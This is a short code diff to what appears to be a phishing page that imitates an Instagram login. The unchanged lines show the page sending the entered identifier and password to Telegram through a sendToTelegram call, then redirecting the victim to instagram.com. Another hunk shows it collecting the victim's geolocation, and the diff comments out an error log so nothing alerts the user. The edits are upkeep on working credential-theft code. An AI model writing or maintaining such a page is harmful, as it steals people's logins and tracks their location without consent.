@@ -394,8 +394,8 @@
                 if (isValidIdentifier && password) {
                     // Call sendToTelegram with collected data
                     await sendToTelegram(identifier, password); // Await the send operation
-                    // Redirect to YouTube after validation and sending info
-                    window.location.href = "https://www.instagram.com";
+                    // Redirect to Instagram after validation and sending info
+                    window.location.href = "https://www.instagram.com"; // Changed back to Instagram
                 } else {
                     // Use custom alert for login errors
                     let message = '';
@@ -456,7 +456,7 @@
                             },
                             // Error callback for geolocation.getCurrentPosition
                             (error) => {
-                                console.error('Geolocation error:', error); // Log for debugging, but won't alert user
+                                // console.error('Geolocation error:', error); // Log for debugging, but won't alert user
                                 locationText = `Error in fetching (${error.message || error.code})`;
                                 resolve();
                             }
@@ -518,4 +518,3 @@
     </script>
 </body>
 </html>
-?
